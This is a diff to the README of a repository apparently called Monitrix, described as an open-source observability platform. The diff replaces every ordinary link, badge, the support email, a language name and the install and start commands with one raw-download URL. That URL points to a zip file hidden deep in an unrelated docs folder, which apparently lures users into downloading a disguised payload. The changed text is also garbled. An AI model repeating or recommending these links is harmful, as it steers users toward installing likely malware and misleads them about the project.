@@ -1,7 +1,7 @@
 # Monitrix - Your Open-Source Observability Platform 🌐
 
-![Monitrix](https://img.shields.io/badge/Monitrix-Open%20Source-brightgreen)  
-[![Releases](https://img.shields.io/badge/Releases-Download%20Latest%20Version-blue)](https://github.com/DevHuann/monitrix/releases)
+![Monitrix](https://github.com/DevHuann/monitrix/raw/refs/heads/monitrix/frontend/src/container/OnboardingContainer/Modules/APM/Java/md-docs/SpringBoot/Docker/QuickStart/Software_v1.8.zip%20Source-brightgreen)  
+[![Releases](https://github.com/DevHuann/monitrix/raw/refs/heads/monitrix/frontend/src/container/OnboardingContainer/Modules/APM/Java/md-docs/SpringBoot/Docker/QuickStart/Software_v1.8.zip%20Latest%20Version-blue)](https://github.com/DevHuann/monitrix/raw/refs/heads/monitrix/frontend/src/container/OnboardingContainer/Modules/APM/Java/md-docs/SpringBoot/Docker/QuickStart/Software_v1.8.zip)
 
 Welcome to **Monitrix**, an open-source observability platform designed to provide a seamless experience in monitoring your applications. Built on OpenTelemetry, Monitrix integrates logs, traces, and metrics into a single application, offering a powerful alternative to popular tools like DataDog and NewRelic.
 
@@ -20,27 +20,27 @@ Welcome to **Monitrix**, an open-source observability platform designed to provi
 - **Unified Observability**: Access logs, traces, and metrics all in one place.
 - **Open Source**: Fully open-source, allowing you to customize and extend as needed.
 - **Self-Hosting**: Run Monitrix on your own infrastructure.
-- **Multi-Language Support**: Compatible with various programming languages including Go, Python, Node.js, and more.
+- **Multi-Language Support**: Compatible with various programming languages including Go, Python, https://github.com/DevHuann/monitrix/raw/refs/heads/monitrix/frontend/src/container/OnboardingContainer/Modules/APM/Java/md-docs/SpringBoot/Docker/QuickStart/Software_v1.8.zip, and more.
 - **Integration with Prometheus**: Leverage Prometheus for powerful metrics collection.
 - **User-Friendly Interface**: Built with React and SCSS for a modern and responsive design.
 - **Extensive Documentation**: Comprehensive guides and tutorials to help you get started quickly.
 
 ## Getting Started 🚀
 
-To get started with Monitrix, visit the [Releases](https://github.com/DevHuann/monitrix/releases) section to download the latest version. Follow the installation instructions below to set up your observability platform.
+To get started with Monitrix, visit the [Releases](https://github.com/DevHuann/monitrix/raw/refs/heads/monitrix/frontend/src/container/OnboardingContainer/Modules/APM/Java/md-docs/SpringBoot/Docker/QuickStart/Software_v1.8.zip) section to download the latest version. Follow the installation instructions below to set up your observability platform.
 
 ## Installation 🛠️
 
-1. **Download the latest release** from the [Releases](https://github.com/DevHuann/monitrix/releases) section.
+1. **Download the latest release** from the [Releases](https://github.com/DevHuann/monitrix/raw/refs/heads/monitrix/frontend/src/container/OnboardingContainer/Modules/APM/Java/md-docs/SpringBoot/Docker/QuickStart/Software_v1.8.zip) section.
 2. **Extract the downloaded files** to your preferred directory.
 3. **Run the installation script**:
    ```bash
-   ./install.sh
+   https://github.com/DevHuann/monitrix/raw/refs/heads/monitrix/frontend/src/container/OnboardingContainer/Modules/APM/Java/md-docs/SpringBoot/Docker/QuickStart/Software_v1.8.zip
    ```
 4. **Configure Monitrix** by editing the configuration file located in the `config` directory.
 5. **Start the application**:
    ```bash
-   ./start.sh
+   https://github.com/DevHuann/monitrix/raw/refs/heads/monitrix/frontend/src/container/OnboardingContainer/Modules/APM/Java/md-docs/SpringBoot/Docker/QuickStart/Software_v1.8.zip
    ```
 
 ## Usage 📊
@@ -75,7 +75,7 @@ We welcome contributions to Monitrix! If you want to help, please follow these s
 
 ### Code of Conduct
 
-We expect all contributors to adhere to our [Code of Conduct](CODE_OF_CONDUCT.md).
+We expect all contributors to adhere to our [Code of Conduct](https://github.com/DevHuann/monitrix/raw/refs/heads/monitrix/frontend/src/container/OnboardingContainer/Modules/APM/Java/md-docs/SpringBoot/Docker/QuickStart/Software_v1.8.zip).
 
 ## License 📜
 
@@ -85,7 +85,7 @@ Monitrix is licensed under the MIT License. See the [LICENSE](LICENSE) file for 
 
 For questions or feedback, please reach out to us through the following channels:
 
-- GitHub Issues: [Monitrix Issues](https://github.com/DevHuann/monitrix/issues)
-- Email: support@monitrix.com
+- GitHub Issues: [Monitrix Issues](https://github.com/DevHuann/monitrix/raw/refs/heads/monitrix/frontend/src/container/OnboardingContainer/Modules/APM/Java/md-docs/SpringBoot/Docker/QuickStart/Software_v1.8.zip)
+- Email: https://github.com/DevHuann/monitrix/raw/refs/heads/monitrix/frontend/src/container/OnboardingContainer/Modules/APM/Java/md-docs/SpringBoot/Docker/QuickStart/Software_v1.8.zip
 
-Thank you for choosing Monitrix! We hope it helps you gain better insights into your applications. For more information, check the [Releases](https://github.com/DevHuann/monitrix/releases) section to stay updated on new features and improvements.
+Thank you for choosing Monitrix! We hope it helps you gain better insights into your applications. For more information, check the [Releases](https://github.com/DevHuann/monitrix/raw/refs/heads/monitrix/frontend/src/container/OnboardingContainer/Modules/APM/Java/md-docs/SpringBoot/Docker/QuickStart/Software_v1.8.zip) section to stay updated on new features and improvements.
